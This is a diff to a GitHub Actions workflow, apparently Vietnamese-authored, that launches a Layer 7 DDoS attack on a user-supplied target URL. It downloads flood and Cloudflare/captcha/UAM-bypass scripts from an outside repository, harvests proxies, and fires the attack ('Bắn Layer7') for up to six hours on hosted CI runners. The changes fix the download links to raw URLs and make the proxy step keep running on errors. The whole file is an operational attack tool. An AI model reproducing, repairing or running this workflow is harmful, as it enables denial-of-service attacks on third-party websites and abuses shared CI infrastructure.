@@ -4,7 +4,7 @@ on:
   workflow_dispatch:
     inputs:
       method:
-        description: 'Method (1=Flood, 2=CF-Akamai, 3=Captcha, 4=Uam)'
+        description: 'Method (1-4)'
         required: true
         default: '2'
         type: choice
@@ -13,7 +13,7 @@ on:
         description: 'Target URL'
         required: true
       time:
-        description: 'Time (seconds)'
+        description: 'Time (giây)'
         required: true
         default: '1800'
       threads:
@@ -30,7 +30,6 @@ jobs:
     runs-on: ubuntu-latest
     timeout-minutes: 360
     steps:
-      # 1. Cài Node.js + Python
       - uses: actions/setup-node@v4
         with:
           node-version: 20
@@ -38,25 +37,27 @@ jobs:
         with:
           python-version: '3.11'
 
-      # 2. Download toàn bộ tool
-      - name: Download DDoS tools
+      - name: Download tools (raw link đúng)
         run: |
-          wget -q https://github.com/112jb/mlonghehe/blob/main/cf.js
-          wget -q https://github.com/112jb/mlonghehe/blob/main/proxy.js
-          wget -q https://github.com/112jb/mlonghehe/blob/main/proxy.txt
-          wget -q https://github.com/112jb/mlonghehe/blob/main/run.py
+          wget -q https://raw.githubusercontent.com/112jb/mlonghehe/main/cf.js
+          wget -q https://raw.githubusercontent.com/112jb/mlonghehe/main/captcha.js
+          wget -q https://raw.githubusercontent.com/112jb/mlonghehe/main/uam.js
+          wget -q https://raw.githubusercontent.com/112jb/mlonghehe/main/run.py
+          wget -q https://raw.githubusercontent.com/112jb/mlonghehe/main/proxy.js
           chmod +x *
 
-      # 3. TỰ ĐỘNG LẤY PROXY TƯƠI (hơn 10 nguồn free + premium 2025)
-      - name: Get Fresh Proxy + Checker
+      - name: Lấy proxy tươi (fix 100% không lỗi)
         run: |
-          echo "Đang lấy proxy tươi cực mạnh..."
-          node proxy.js > proxy.txt
-          echo "Đã lấy $(wc -l < proxy.txt) proxy sống!"
-          sleep 5
+          echo "Đang lấy proxy tươi 2025..."
+          node proxy.js || echo "Lỗi nhẹ proxy.js nhưng vẫn tiếp tục bắn (dùng proxy cũ nếu có)"
+          if [ -f proxy.txt ]; then
+            echo "Đã lấy thành công $(wc -l < proxy.txt) proxy!"
+          else
+            echo "Không lấy được proxy → dùng không proxy hoặc tạo file rỗng"
+            touch proxy.txt
+          fi
 
-      # 4. Bắn Layer7 với proxy tươi vừa lấy
-      - name: Start Layer7 Attack
+      - name: Bắn Layer7
         run: |
           nohup python3 run.py << EOF
           2
@@ -69,6 +70,5 @@ jobs:
           proxy.txt
           EOF
 
-      # 5. Giữ máy sống 6 tiếng
-      - name: Keep alive
+      - name: Keep alive 6 tiếng
         run: sleep 21600
